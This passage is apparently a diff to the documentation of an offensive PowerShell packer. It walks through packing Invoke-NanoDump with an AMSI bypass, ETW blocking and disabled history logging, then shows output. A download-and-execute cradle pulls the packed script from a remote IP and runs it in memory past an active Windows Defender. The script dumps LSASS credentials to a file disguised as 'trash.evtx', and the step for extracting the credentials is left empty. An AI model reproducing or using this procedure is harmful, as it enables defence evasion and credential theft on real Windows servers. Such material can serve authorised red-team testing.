@@ -203,3 +203,97 @@ PS C:\> invoke-rubeus "hash /password:SuperPassword"
 
 [!] /user:X and /domain:Y need to be supplied to calculate AES and DES hash types!
 <SNIP>
+
+
+
+===================================================================================================================================================
+Example 2 - Create & run a packed/encrypted version of "invoke-nanodump.ps1" on a Windows Server 2016 without getting detected by Windows Defender
+===================================================================================================================================================
+
+Step 1 - Create a packed/encrypted version of the script 'invoke-nanodump.ps1' using 'Invoke-PoSH-Packer.ps1'
+-------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> . .\Invoke-PoSH-Packer.ps1
+
+  ___     ___ _  _     ___         _
+ | _ \___/ __| || |___| _ \___  __| |_____ _ _
+ |  _/ _ \__ \ __ |___|  _/ _ |/ _| / / -_) '_|
+ |_| \___/___/_||_|   |_| \__,|\__|_\_\___|_|
+                                             v1.1
+Usage:
+> Invoke-PoSH-Packer -FileUrl https://URL/script.ps1 -OutFile C:\path\Packed-script.ps1
+> Invoke-PoSH-Packer -FilePath C:\path\script.ps1 -OutFile C:\path\Packed-script.ps1
+
+Features:
+[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+PS C:\temp> Invoke-PoSH-Packer -FileUrl https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1 -OutFile C:\temp\Packed-nano.ps1
+[*] Downloading the remote file: 'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-NanoDump.ps1'
+[*] File compression (GZip)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] Writing the obfuscated & encrypted PowerShell script: 'C:\temp\Packed-nano.ps1' ...
+[+] Done!
+PS C:\temp>
+
+
+Step 2 - Download & execute into memory the packed/encrypted version of the script 'Invoke-rubeus' without being detected by the Windows Defender AV
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator> systeminfo
+
+Host Name:                 WEBSERVER2
+OS Name:                   Microsoft Windows Server 2016 Datacenter
+OS Version:                10.0.14393 N/A Build 14393
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Member Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+<SNIP>
+
+
+PS C:\Users\Administrator> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 02/02/2023 04:49:12
+
+
+PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/temp/Packed-posh-nano.ps1');invoke-nanodump
+
+Exit functions patched: True
+
+Trying to dump LSASS to: C:\windows\temp\trash.evtx
+lsass.exe found
+The minidump has an invalid signature, restore it running:
+bash restore_signature.sh trash.evtx
+Done, to get the secretz run:
+python3 -m pypykatz lsa minidump trash.evtx
+Thread Complete
+
+Dumpfile successfully created!
+
+
+PS C:\Users\Administrator> ls C:\Windows\Temp\trash.evtx
+
+    Directory: C:\Windows\Temp
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       03/02/2023     09:05       10792858 trash.evtx
+
+
+Step 3 - Extract the credentials stored in the lssas dump (trash.evtx) made by invoke-nanodump
+------------------------------------------------------------------------------------------------
+
+
+
